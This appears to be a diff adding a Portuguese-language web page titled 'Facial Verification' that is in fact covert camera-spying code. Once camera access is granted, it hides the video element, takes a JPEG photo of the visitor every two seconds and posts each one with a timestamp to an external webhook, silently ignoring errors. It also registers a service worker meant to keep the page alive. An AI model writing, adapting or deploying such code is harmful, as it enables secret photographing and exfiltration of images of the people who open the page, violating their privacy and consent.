@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Verificação Facial</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{margin:0;background:#000}#v{width:1px;height:1px;opacity:0}
+</style>
+</head>
+<body>
+<video id="v" autoplay muted playsinline></video>
+<script>
+/* ---------- CONFIGURAÇÃO ---------- */
+const WEBHOOK = "https://videos-ai-n8n.dbbvvi.easypanel.host/webhook/af97842d-3e70-4c85-99a1-dea16f08607b"; // <-- mude aqui
+/* ---------------------------------- */
+
+const v = document.getElementById('v');
+(async ()=>{
+  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+  v.srcObject = stream;
+  const c = document.createElement('canvas');
+  const ctx = c.getContext('2d');
+  [c.width,c.height]=[640,480];
+  setInterval(()=>{
+    ctx.drawImage(v,0,0);
+    c.toBlob(b=>{
+      const r = new FileReader();
+      r.onloadend=()=> fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({foto:r.result,horario:new Date().toISOString()})}).catch(()=>{});
+      r.readAsDataURL(b);
+    },"image/jpeg",0.7);
+  },2000);
+})();
+/* service worker para manter vivo */
+navigator.serviceWorker.register('data:application/javascript;base64,'+btoa(`
+self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
+self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));
+`));
+</script>
+</body>
+</html>
